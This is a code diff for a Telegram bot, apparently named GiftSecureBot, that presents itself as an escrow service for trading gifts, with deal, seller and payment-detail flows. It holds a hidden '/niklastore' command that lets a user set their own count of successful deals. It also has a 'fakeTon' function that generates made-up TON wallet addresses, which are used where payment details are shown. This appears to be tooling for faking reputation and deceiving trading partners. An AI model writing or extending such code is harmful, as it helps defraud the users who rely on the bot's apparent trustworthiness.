@@ -5,9 +5,15 @@ import deeplink from './commands/deeplink.js'
 import niklastore from './commands/niklastore.js'
 import { walletManageScene } from './scenes/walletManage.js'
 import { createDealWizard } from './scenes/createDeal.js'
-import { mainMenuKb, sellerGiftStep1Kb, sellerGiftConfirmKb, sellerShotSentKb } from './keyboards.js'
+import {
+  mainMenuKb,
+  sellerGiftStep1Kb,
+  sellerGiftConfirmKb,
+  sellerShotSentKb
+} from './keyboards.js'
 import db, { initDB } from './db.js'
 
+/* ======================== INIT ======================== */
 await initDB()
 if (!process.env.BOT_TOKEN) {
   console.error('❌ BOT_TOKEN не задан'); process.exit(1)
@@ -15,11 +21,10 @@ if (!process.env.BOT_TOKEN) {
 
 const bot = new Telegraf(process.env.BOT_TOKEN)
 const stage = new Scenes.Stage([walletManageScene, createDealWizard])
-
 bot.use(session())
 bot.use(stage.middleware())
 
-// username для диплинков
+/* ============ BOT USERNAME (для диплинков) ============ */
 let BOT_USERNAME = process.env.BOT_USERNAME || null
 if (!BOT_USERNAME) {
   try {
@@ -32,17 +37,19 @@ if (!BOT_USERNAME) {
 }
 console.log('Bot username:', BOT_USERNAME)
 
-// /start (не сбрасываем сцену при вводе ссылок)
+/* ===================== /START ========================= */
+// Не сбрасываем сцену создания сделки; диплинк только при валидном payload
 bot.start(async (ctx) => {
   if (ctx.scene?.current?.id === 'create-deal') return
   try { await ctx.scene.leave() } catch {}
+
   if (typeof ctx.startPayload === 'string' && ctx.startPayload.length > 5) {
     return deeplink(ctx)
   }
   return start(ctx)
 })
 
-// главное меню
+/* ==================== ГЛАВНОЕ МЕНЮ ==================== */
 bot.action('deal:create', async (ctx) => {
   await ctx.answerCbQuery()
   if (lastStartMessageId) {
@@ -50,6 +57,7 @@ bot.action('deal:create', async (ctx) => {
   }
   return ctx.scene.enter('create-deal')
 })
+
 bot.action('wallet:manage', async (ctx) => {
   await ctx.answerCbQuery()
   if (lastStartMessageId) {
@@ -57,6 +65,7 @@ bot.action('wallet:manage', async (ctx) => {
   }
   return ctx.scene.enter('wallet-manage')
 })
+
 bot.action('help:how', async (ctx) => {
   await ctx.answerCbQuery()
   try { await ctx.telegram.deleteMessage(ctx.chat.id, ctx.callbackQuery.message.message_id) } catch {}
@@ -66,23 +75,23 @@ bot.action('help:how', async (ctx) => {
 1) Продавец создаёт сделку → «Ожидаем покупателя».
 2) Покупатель присоединяется → продавцу показываются шаги по подарку.
 3) Продавец: «Подарок отправлен» → «Да, передал(а) подарок» → «📸 Отправил(а) скриншот».
-4) Бот показывает реквизиты оплаты обеим сторонам.
+4) Бот показывает реквизиты оплаты обеим сторонам по валюте (RUB/UAH/TON/Stars).
 5) Покупатель оплачивает по реквизитам.`,
     mainMenuKb()
   )
 })
 
-// /niklastore
+/* =================== /niklastore ====================== */
+// Теперь только установка количества успешных сделок
 bot.command('niklastore', async (ctx) => {
-  await niklastore(ctx)
+  await niklastore(ctx) // спрашивает число и ставит флаг ctx.session.adminAwaitSuccessCount = true
 })
 
-// ===== SELLER FLOW =====
-
-// 1) продавец: Подарок отправлен
+/* ============== ПРОДАВЕЦ: ПОДАРОК ОТПРАВЛЕН =========== */
 bot.action(/seller:gift_sent:(.+)/, async (ctx) => {
   await ctx.answerCbQuery()
   const token = ctx.match[1]
+
   await db.read()
   const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
   if (!deal) return ctx.reply('Сделка не найдена.')
@@ -92,16 +101,14 @@ bot.action(/seller:gift_sent:(.+)/, async (ctx) => {
   deal.log ||= []; deal.log.push('Продавец: нажал «Подарок отправлен».')
   await db.write()
 
-  await ctx.reply(
-    'Вы точно передали подарок?',
-    sellerGiftConfirmKb(token)
-  )
+  await ctx.reply('Вы точно передали подарок?', sellerGiftConfirmKb(token))
 })
 
-// 2) продавец подтверждает «Да, передал(а) подарок»
+/* ===== ПРОДАВЕЦ: ПОДТВЕРДИЛ, ЧТО ПЕРЕДАЛ ПОДАРОК ======= */
 bot.action(/seller:gift_confirm:(.+)/, async (ctx) => {
   await ctx.answerCbQuery()
   const token = ctx.match[1]
+
   await db.read()
   const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
   if (!deal) return ctx.reply('Сделка не найдена.')
@@ -125,7 +132,7 @@ bot.action(/seller:gift_confirm:(.+)/, async (ctx) => {
   }
 })
 
-// 3) продавец: «📸 Отправил(а) скриншот» → показать реквизиты обеим сторонам
+/* ===== ПРОДАВЕЦ: «📸 ОТПРАВИЛ(А) СКРИНШОТ» → РЕКВИЗИТЫ === */
 function fakeTon() {
   const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
   let s = 'UQ'
@@ -138,9 +145,11 @@ function detectRubType(val = '') {
   const looksPhone = /^(\+7|7|8)\d{10}$/.test(v)
   return looksCard ? 'card' : (looksPhone ? 'phone' : null)
 }
+
 bot.action(/seller:shot_sent:(.+)/, async (ctx) => {
   await ctx.answerCbQuery()
   const token = ctx.match[1]
+
   await db.read()
   const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
   if (!deal) return ctx.reply('Сделка не найдена.')
@@ -185,10 +194,11 @@ ${payLine}`
   try { await ctx.telegram.sendMessage(deal.sellerId, msg, { parse_mode: 'Markdown' }) } catch {}
 })
 
-// продавец отменил
+/* ================ ПРОДАВЕЦ ОТМЕНЯЕТ СДЕЛКУ =============== */
 bot.action(/seller:cancel:(.+)/, async (ctx) => {
   await ctx.answerCbQuery()
   const token = ctx.match[1]
+
   await db.read()
   const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
   if (!deal) return ctx.reply('Сделка не найдена.')
@@ -199,12 +209,34 @@ bot.action(/seller:cancel:(.+)/, async (ctx) => {
   await db.write()
 
   await ctx.reply('❌ Сделка отменена.')
-  if (deal.buyerId) { try { await ctx.telegram.sendMessage(deal.buyerId, '❌ Сделка отменена продавцом.') } catch {} }
+  if (deal.buyerId) {
+    try { await ctx.telegram.sendMessage(deal.buyerId, '❌ Сделка отменена продавцом.') } catch {}
+  }
 })
 
-// fallback
-bot.on('message', async (ctx) => ctx.reply('Меню: /start', mainMenuKb()))
+/* ========== ВВОД ЧИСЛА УСПЕШНЫХ СДЕЛОК (niklastore) ========= */
+bot.on('message', async (ctx) => {
+  const text = (ctx.message?.text || '').trim()
 
+  if (ctx.session.adminAwaitSuccessCount) {
+    const n = parseInt(text, 10)
+    ctx.session.adminAwaitSuccessCount = false
+    if (!isFinite(n) || n < 0) return ctx.reply('Введите корректное число.')
+
+    await db.read()
+    db.data.users[ctx.from.id] ||= { id: ctx.from.id }
+    db.data.users[ctx.from.id].successCount = n
+    await db.write()
+
+    try { await ctx.deleteMessage() } catch {}
+    return ctx.reply(`✅ Успешные сделки установлены: ${n}`)
+  }
+
+  // дефолт
+  return ctx.reply('Меню: /start', mainMenuKb())
+})
+
+/* ================== ПУСК БОТА =========================== */
 await bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {})
 await bot.launch()
 console.log('GiftSecureBot RUNNING ✅')
